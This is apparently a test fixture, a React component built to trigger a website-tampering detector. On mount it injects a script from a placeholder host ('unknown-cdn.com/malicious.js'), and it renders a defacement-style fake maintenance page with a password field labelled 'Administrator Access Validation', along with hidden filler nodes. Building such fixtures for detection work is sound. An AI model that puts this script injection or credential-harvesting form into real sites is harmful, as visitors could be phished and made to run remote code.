import React, { useEffect } from 'react';

/**
 * MainContent - Script Injection Test Version
 * 
 * Focus:
 * - Structural drift via useEffect injection
 * - Testing script_injection_new_domain trigger
 */
const MainContent = () => {

  // --- TEST: Script Injection (script_injection_new_domain) ---
  useEffect(() => {
    // Manually injecting the script into the real DOM
    const script = document.createElement("script");
    script.src = "https://unknown-cdn.com/malicious.js";
    script.id = "malicious-script-trigger";
    script.async = true;
    
    document.body.appendChild(script);

    // Cleanup when component unmounts
    return () => {
      const el = document.getElementById("malicious-script-trigger");
      if (el) document.body.removeChild(el);
    };
  }, []);

  return (
    <div className="defaced-root" id="layer1-pwned-zone">
      <header
        className="hacked-header"
        style={{
          backgroundColor: '#111',
          color: '#ff4444',
          padding: '50px',
          textAlign: 'center',
        }}
      >
        <h1 style={{ fontSize: '3rem', marginBottom: '10px' }}>
          PLATFORM MAINTENANCE ACTIVE
        </h1>
        <h2 style={{ fontWeight: 'normal' }}>
          User services are temporarily operating in restricted mode
        </h2>
      </header>

      <main className="content-purge" style={{ padding: '30px' }}>
        <p>
          We are currently performing a large-scale infrastructure migration...
        </p>

        {/* LARGE CONTENT REWRITE */}
        <section
          style={{
            background: '#1b1b1b',
            color: '#f5f5f5',
            padding: '25px',
            borderRadius: '8px',
            marginTop: '30px',
          }}
        >
          <h3>Infrastructure Update Notice</h3>
          <p>Several backend services are being redeployed...</p>
        </section>

        {/* FORM TEST */}
        <form
          action="/verify"
          method="POST"
          style={{
            margin: '40px 0',
            border: '2px solid #ff4444',
            padding: '20px',
            borderRadius: '6px',
          }}
        >
          <h3>Administrator Access Validation</h3>
          <input type="password" placeholder="Enter credential" style={{ padding: '12px', width: '100%' }} />
          <button type="submit" style={{ backgroundColor: '#ff4444', color: 'white', padding: '12px 24px', marginTop: '10px' }}>
            Validate Session
          </button>
        </form>
      </main>

      {/* Structural filler to maintain node count for baseline comparison */}
      <div style={{ opacity: 0, height: 0 }}>
        {Array.from({ length: 400 }).map((_, i) => (
          <section key={i}><span id={`drift-node-${i}`}>ENTROPY</span></section>
        ))}
      </div>

      <footer style={{ textAlign: 'center', padding: '20px', borderTop: '4px solid #ff4444' }}>
        <b>SYSTEM STATUS: MAINTENANCE MODE</b>
      </footer>
    </div>
  );
};

export default MainContent;
